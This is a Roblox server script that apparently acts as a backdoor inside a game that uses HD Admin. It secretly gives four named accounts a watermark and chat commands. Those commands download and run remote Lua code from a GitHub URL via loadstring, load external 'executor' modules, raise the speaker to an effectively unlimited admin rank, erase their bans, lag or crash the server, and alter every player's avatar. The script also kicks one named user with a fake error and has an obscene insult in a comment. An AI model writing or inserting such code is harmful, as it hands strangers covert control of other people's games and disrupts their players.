print("State1")
local Players = game.Players
local trolling = {
	[3783228048]=true,
	--[3264445159]=true
}
local pantsids = {
	5720984882,
	11700362334,
	6877514341,
	--5775544779,
	13819646228,
	13257818107, --b
	13499361419, --b
	6465175779,
	10307069395,
	8626213144,
	6783530937,
	7918949707,
	7918949707,
	6289806715,
	14036220919,
	10618287948,
	4939974904,
	--11923680669,
	--8712071160,
}
local shirtids = {
	14443254505,
	14068558142,
	12158002502,
	16818978816,
	12499161503,
	13257821984, --b
	15899668884,
	12358077159,
	14538236803,
	590744260,
	6064644216,
	7026573486,
	--5529692544,
	--12339022358,
}
local maxaccessory = 5
local acessory = {
	13912732291,
	12154587792,
	7386135926,
	12728094797,
	14876851501,
	16745731059,
	13477829910,
	13503698033,
	5235466845,
	5891243570,
	12938636315,
	12471351110,
	14516302303,
	16130217881,
	6102712313,
	5802803573,
	--15611719171,
	--12865569756,
}
local InsertService = game:GetService("InsertService")
Players.PlayerAdded:Connect(function(plr)
	plr.CharacterAdded:Connect(function(char)
		local Pants = char:FindFirstChildOfClass("Pants") or Instance.new("Pants",char)
		local Shirt = char:FindFirstChildOfClass("Shirt") or Instance.new("Shirt",char)
		--

		if trolling[plr.UserId] then
			pcall(function()
				Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id="..shirtids[math.random(1,#pantsids)]
				Pants.PantsTemplate = "http://www.roblox.com/asset/?id="..pantsids[math.random(1,#pantsids)]
				char:FindFirstChild("Head"):FindFirstChild("face").Texture = "http://www.roblox.com/asset/?id=7050177264"
				local selected = {

				}
				for i = 1,3 do
					local selecteda = nil
					repeat selecteda = acessory[math.random(1,#acessory)] until selected[selecteda]==nil
					local accessory3 = InsertService:LoadAsset(selecteda):GetChildren()[1]
					accessory3.Parent = char
				end
			end)
		end
	end)
end)
repeat task.wait() until _G.HDAdminMain~=nil
print("State2")
local main = _G.HDAdminMain
local HttpService = game.HttpService
local AdminPanel = {
	"t10_kol",
	"LuckDanil",
	"EnvoyOfHead",
	"lyovka1",
}
local Version_of_theScript = "V1.0.2 ALPHA"
local EnabledDoDOS = false
local BlackList = {
	["Vad_75"]=true, --< Vadik Pidorasik
}
local LagEnabled = false
local LagObjcets = {
}

game.Players.PlayerAdded:Connect(function(player)


	if BlackList[player.Name] then
		if EnabledDoDOS==true then 
			player:Kick("Error While Connecting To Experience") --Соси Хуй Вад 😀
		end
	end
	if table.find(AdminPanel,player.Name) ~= nil then
			local Watermark = Instance.new("ScreenGui")
local WaterMark = Instance.new("TextLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")

--Properties:

Watermark.Name = "Watermark"
Watermark.Parent = player:WaitForChild("PlayerGui")
Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

WaterMark.Name = "WaterMark"
WaterMark.Parent = Watermark
WaterMark.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
WaterMark.BackgroundTransparency = 1.000
WaterMark.BorderColor3 = Color3.fromRGB(0, 0, 0)
WaterMark.BorderSizePixel = 0
WaterMark.Position = UDim2.new(0, 0, 0.951186121, 0)
WaterMark.Size = UDim2.new(0.0867430419, 0, 0.0474452563, 0)
WaterMark.Font = Enum.Font.Code
WaterMark.LineHeight = 1.350
WaterMark.Text = "ADM System "..Version_of_theScript
WaterMark.TextColor3 = Color3.fromRGB(255, 255, 255)
WaterMark.TextScaled = true
WaterMark.TextSize = 14.000
WaterMark.TextWrapped = true

UIAspectRatioConstraint.Parent = WaterMark
UIAspectRatioConstraint.AspectRatio = 4.077
		require(7192763922).load(player.Name)


		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
		--main.signals.ShowBannedUser:FireClient(plr, banDetails)


		pcall(function()
			print(main:GetModule("cf"))
			--main:GetModule("cf"):SetRank(player, game.CreatorId, 4, "Perm")
			local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
			--targetName, targetId, targetReason, record
			if banDetails then
				record.BanTime = os.time()
				if record.Server ~= "Current" then
					main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
				end
				--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
			end
		end)
		player.Chatted:Connect(function(message)
			print("message was send")
			local args = message:split(" ") -- Splits arguments.
			if args[1]:lower() == "/e ADM.Message" then -- Checks if the command was used.
				local announcemsg = message:sub(args[1]:len() + 2,-1) 
				local message_COOL = Instance.new("Message",workspace)
				message_COOL.Text = announcemsg
				game.Debris:AddItem(message_COOL,10)
			end
			if message == "/e ADM.Restart" then
				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
				local f = loadstring(code)
				f()
			elseif message == "/e ADM.Sky" then
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
			elseif message == "/e ADM.RankMe" then
				main:GetModule("cf"):SetRank(player, game.CreatorId, 999999999999999, "Perm")
			elseif message == "/e ADM.Sky2" then
				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
			elseif message == "/e ADM.antivad" then
				EnabledDoDOS = not EnabledDoDOS
			elseif message == "/e ADM.Fun" then
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
					local mesh = Instance.new("SpecialMesh",Part)

					mesh.MeshId = "rbxassetid://7606070501"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
				end
				--rbxassetid://5679232242
			elseif message == "/e ADM.Fun2" then
				print("VER3")
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local CharMesh1 = Instance.new("CharacterMesh",player2.Character)
					CharMesh1.MeshId = 83001137
					CharMesh1.BodyPart = Enum.BodyPart.LeftArm
					local CharMesh2 = Instance.new("CharacterMesh",player2.Character)
					CharMesh2.MeshId = 83001181
					CharMesh2.BodyPart = Enum.BodyPart.RightArm
					local AccessoryBlackList = {
						[Enum.AccessoryType.Back]=true,
						[Enum.AccessoryType.Front]=true,
						[Enum.AccessoryType.Waist]=true,
						[Enum.AccessoryType.Shoulder]=true,
					}
					for _, accessory:Accessory in pairs(player2.Character:GetChildren()) do
						if accessory:IsA("Accessory") then
							if AccessoryBlackList[accessory.AccessoryType] then
								accessory:Destroy()
							end
						end
					end
					local mesh = Instance.new("SpecialMesh",player2.Character.Torso)

					mesh.MeshId = "rbxassetid://5679232242"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
					mesh.Scale = Vector3.new(2.02, 2.02, 2.02)


					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Size = Vector3.new(1.45, 0.944, 1.048)
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0, 0.202, -0.465)
					local mesh2 = Instance.new("SpecialMesh",Part)

					mesh2.MeshId = "rbxassetid://5679326691"
					mesh2.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
					mesh2.Scale = Vector3.new(2.02, 2.02, 2.02)

					--left leg

					local mesh3 = Instance.new("SpecialMesh",player2.Character["Left Leg"])

					mesh3.MeshId = "rbxassetid://5679229838"
					mesh3.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
					mesh3.Scale = Vector3.new(2.02, 2.02, 2.02)

					--right leg

					local mesh4 = Instance.new("SpecialMesh",player2.Character["Right Leg"])

					mesh4.MeshId = "rbxassetid://5679231042"
					mesh4.TextureId = player2.Character:FindFirstChildOfClass("Pants").PantsTemplate
					mesh4.Scale = Vector3.new(2.02, 2.02, 2.02)
				end
				--rbxassetid://5679232242
			elseif message == "/e ADM.Executor" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(6324372525).fse(player.Name)
			elseif message == "/e ADM.Executor2" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(5419042716).PraiseSkidGod(player.Name)
			elseif message == "/e ADM.Lag.Start" then
				LagEnabled = true


			elseif message == "/e ADM.Lag.Stop" then
				LagEnabled=false
				for index,lagobj in pairs(LagObjcets) do
					lagobj:Destroy()
				end
			elseif message == "/e ADM.Crash" then
				while tick() do
					print("CrashTHEServer")
				end
			end
		end)
	end
end)

--[[
for _, player in pairs(game.Players:GetPlayers()) do
	if table.find(AdminPanel,player.Name) ~= nil then
		require(7192763922).load(player.Name)


		--local banDetails = main:GetModule("cf"):GetBannedUserDetails(plr)
		--main.signals.ShowBannedUser:FireClient(plr, banDetails)
		main:GetModule("cf"):SetRank(game:GetService("Players")[player.name], game.CreatorId, 999999999999999, "Perm")  
		pcall(function()
			local banDetails, record = main:GetModule("cf"):GetBannedUserDetails(player.Name)
			--targetName, targetId, targetReason, record
			if banDetails then
				record.BanTime = os.time()
				if record.Server ~= "Current" then
					main:GetModule("SystemData"):InsertStat("Banland", "RecordsToModify", record)
				end
				--main:GetModule("cf"):FormatAndFireNotice(speaker, "UnBanSuccess", banDetails[1])
			end
		end)
		player.Chatted:Connect(function(message)
			if message == "ADM.Restart" then
				local code = HttpService:GetAsync("https://raw.githubusercontent.com/t10underscorekol/Rblx-Thing/main/Modules/newthing.lua", true)
				local f = loadstring(code)
				f()
			elseif message == "ADM.Sky" then
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = "http://www.roblox.com/asset/?id=16790027131"
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = "http://www.roblox.com/asset/?id=16790027131"
			elseif message == "ADM.Sky2" then
				local id = game.GroupService:GetGroupInfoAsync(32993955).EmblemUrl
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxBk = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxDn = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxFt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxLf = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxRt = id
				game.Lighting:FindFirstChildOfClass("Sky").SkyboxUp = id
			elseif message == "ADM.Fun" then
				for _, player2 in pairs(game.Players:GetPlayers()) do
					local Part = Instance.new("Part",player2.Character)
					Part.CanCollide=false
					Part.CFrame = player2.Character.Torso.CFrame
					Part.Color = player2.Character.Torso.Color
					local weld = Instance.new("Weld",Part)
					weld.Part0 = player2.Character.Torso
					weld.Part1 = Part
					weld.C0 = CFrame.new(0,0.5,-0.75) * CFrame.Angles(0,math.rad(-90),0)
					local mesh = Instance.new("SpecialMesh",Part)

					mesh.MeshId = "rbxassetid://7606070501"
					mesh.TextureId = player2.Character:FindFirstChildOfClass("Shirt").ShirtTemplate
				end
			elseif message == "ADM.Executor" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(6324372525).fse(player.Name)
			elseif message == "ADM.Executor2" then
				local Part = Instance.new("Part",workspace)
				Part.CanCollide=true
				Part.CFrame = player.Character.Torso.CFrame
				require(5419042716).PraiseSkidGod(player.Name)
			elseif message == "ADM.Lag.Start" then
				LagEnabled = true


			elseif message == "ADM.Lag.Stop" then
				LagEnabled=false
				for index,lagobj in pairs(LagObjcets) do
					lagobj:Destroy()
				end
			end
		end)
	end


end
]]
game["Run Service"].Heartbeat:Connect(function()


	if LagEnabled==false then return end
	for index,value:Part in pairs(LagObjcets) do
		value.Velocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5))
	end
	for _, player2 in pairs(game.Players:GetPlayers()) do
		for i = 1,5 do
			local Part = Instance.new("Part",workspace)
			Part.CanCollide=true
			Part.CFrame = player2.Character.Torso.CFrame
			Part.Shape = Enum.PartType.Ball
			Part.Locked = true
			table.insert(LagObjcets,Part)
		end
	end
end)
